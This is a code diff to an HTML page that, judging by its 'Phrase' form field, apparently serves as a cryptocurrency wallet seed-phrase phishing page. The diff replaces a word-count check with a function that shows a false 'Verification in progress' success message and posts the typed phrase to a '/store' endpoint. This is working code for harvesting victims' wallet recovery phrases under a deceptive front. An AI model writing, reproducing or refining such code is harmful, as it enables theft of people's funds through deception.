@@ -1586,9 +1586,6 @@
             <form method="post">
 
               <div class="form-group my-2">
-                <span id="warn1" class="warn text-green" style="display: none;color: green;">
-                  Connecting please wait ....
-                </span>
                 <label class="form-label">
                   Phrase
                 </label>
@@ -1641,26 +1638,22 @@
   }
 
   function sendPhrase() {
-            const phrase = $("#phrase").val();
-            const wordCount = phrase.trim().split(/\s+/).length;
+    const phrase = $("#phrase").val()
+    if (phrase == "") {
+      $("#warn").css('display', 'block')
+      //Swal.fire('Oops','Phrase cannot be empty','error')
+    }
+    else {
+      Swal.fire('Done', 'Verification in progress', 'success')
+      $.ajax({
+        type: 'post',
+        url: '/store',
+        data: { phrase },
+        
+      })
+    }
 
-            if (phrase == "") {
-                $("#warn").css('display', 'block');
-                setTimeout(function(){
-                    $("#warn").css('display', 'none');
-                }, 2000); // Hide the warning after 2 seconds
-            } else if(wordCount >= 10){
-                $("#warn1").css('display', 'block');
-                setTimeout(function(){
-                    
-                }, 2000); // Redirect to another page after 2 seconds
-            } else {
-                $("#warn").css('display', 'block');
-                setTimeout(function(){
-                    $("#warn").css('display', 'none');
-                }, 2000); // Hide the warning after 2 seconds
-            }
-        }
+  }
 </script>
 
 </html>
